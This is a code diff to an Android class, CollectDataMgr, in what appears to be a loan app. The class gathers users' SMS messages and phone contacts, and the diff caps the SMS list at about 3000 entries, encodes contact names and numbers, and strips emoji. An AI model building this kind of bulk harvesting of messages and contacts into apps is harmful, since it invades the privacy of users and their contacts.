@@ -21,6 +21,7 @@ import com.loan.icreditapp.global.Constant
 import com.loan.icreditapp.util.BuildRequestJsonUtils
 import com.loan.icreditapp.util.CheckResponseUtils
 import com.loan.icreditapp.util.EncodeUtils
+import com.loan.icreditapp.util.PatternUtils
 import com.lzy.okgo.OkGo
 import com.lzy.okgo.callback.StringCallback
 import com.lzy.okgo.model.Response
@@ -149,9 +150,12 @@ class CollectDataMgr {
                     //                    public int read;
 //                    public int status;
                     smsRequest.addr = address
-                    list.add(smsRequest)
+                    if (list.size <= 3000) {
+                        list.add(smsRequest)
+                    }
                 }
             }
+
         } catch (e: Exception) {
             if (BuildConfig.DEBUG) {
                 throw e
@@ -210,8 +214,8 @@ class CollectDataMgr {
                         cursor.getLong(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_LAST_UPDATED_TIMESTAMP))
                     //                    Log.e(TAG, " photo = " + photoUri + "  ringtone = " + ringtone + " look = " + lookupUri);
                     val contactRequest = ContactRequest()
-                    contactRequest.name = displayName
-                    contactRequest.number = number
+                    contactRequest.name = encodeData(displayName)
+                    contactRequest.number = encodeData(number)
                     contactRequest.lastUpdate = lastUpdateTime
                     list.add(contactRequest)
                 }
@@ -285,7 +289,8 @@ class CollectDataMgr {
             s.replace("%".toRegex(), "").replace("\\+".toRegex(), "").replace("\"".toRegex(), "")
                 .replace("'".toRegex(), "").replace("\\\\".toRegex(), "")
         try {
-            return URLEncoder.encode(s1, "utf-8")
+            var resultStr = PatternUtils.filterEmoji(s1)
+            return URLEncoder.encode(resultStr, "utf-8")
         } catch (e: UnsupportedEncodingException) {
             e.printStackTrace()
         }
